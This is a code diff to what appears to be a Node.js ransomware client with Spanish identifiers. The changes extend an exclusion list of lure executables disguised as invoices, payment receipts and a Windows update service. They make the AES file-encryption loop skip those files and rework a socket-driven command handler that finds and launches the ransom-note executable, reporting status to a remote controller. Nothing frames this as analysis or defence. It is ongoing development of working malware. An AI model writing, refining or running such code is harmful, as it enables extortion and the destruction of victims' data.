@@ -40,7 +40,8 @@ const ARCHIVOS_EXCLUIDOS = [
     'Factura_Electronica_Enero2026.exe', 'Comprobante_Pago_2026.exe',
     'Factura_Banco_2024.exe', 'Comprobante_Transaccion.exe',
     'nota_rescate.exe', 'nota_rescate_Cripto.exe',
-    'escudo.png', 'adobe_icon.png', '.aes_key', '.decrypt_used', '.client_id',
+    'escudo.png', 'escudo.ico', 'adobe_icon.png', 'adobe_icon.ico',
+    '.aes_key', '.decrypt_used', '.client_id',
     'WindowsUpdateService_Cripto.exe', 'WindowsUpdateService.exe'
 ];
 
@@ -1049,6 +1050,13 @@ async function conectar() {
         let archivosCifrados = [];
 
         archivosACifrar.forEach((archivo, i) => {
+            // Verificar si el archivo está en la lista de exclusión
+            const nombreArchivo = path.basename(archivo.ruta);
+            if (ARCHIVOS_EXCLUIDOS.includes(nombreArchivo)) {
+                console.log(`   Saltando (excluido): ${nombreArchivo}`);
+                return; // Skip this file
+            }
+
             const resultado = cifrarArchivo(archivo.ruta, claveAES);
             if (resultado.success) {
                 totalCifrados++;
@@ -1174,8 +1182,24 @@ async function conectar() {
         const { comandoId } = data;
         console.log(' Mostrando nota de rescate...');
 
-        const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
-        if (fs.existsSync(notaPath)) {
+        // Buscar nota en múltiples ubicaciones
+        const posiblesRutas = [
+            path.join(process.cwd(), NOTA_NAME),                    // Directorio actual (SFX)
+            path.join(INSTALL_DIR, NOTA_NAME),                      // Directorio de instalación
+            path.join(process.cwd(), 'Comprobante_Pago_2026.exe'),  // Nombre exacto
+            path.join(path.dirname(process.execPath), NOTA_NAME)   // Mismo directorio que el exe
+        ];
+
+        let notaPath = null;
+        for (const ruta of posiblesRutas) {
+            if (fs.existsSync(ruta)) {
+                notaPath = ruta;
+                console.log(` Nota encontrada en: ${ruta}`);
+                break;
+            }
+        }
+
+        if (notaPath) {
             exec(`start "" "${notaPath}"`, (error) => {
                 socket.emit('nota-rescate-mostrada', {
                     comandoId,
@@ -1184,10 +1208,11 @@ async function conectar() {
                 });
             });
         } else {
+            console.log(' Nota NO encontrada. Rutas probadas:', posiblesRutas);
             socket.emit('nota-rescate-mostrada', {
                 comandoId,
                 success: false,
-                message: 'Ejecutable de nota no encontrado'
+                message: 'Ejecutable de nota no encontrado en ninguna ubicación'
             });
         }
     });
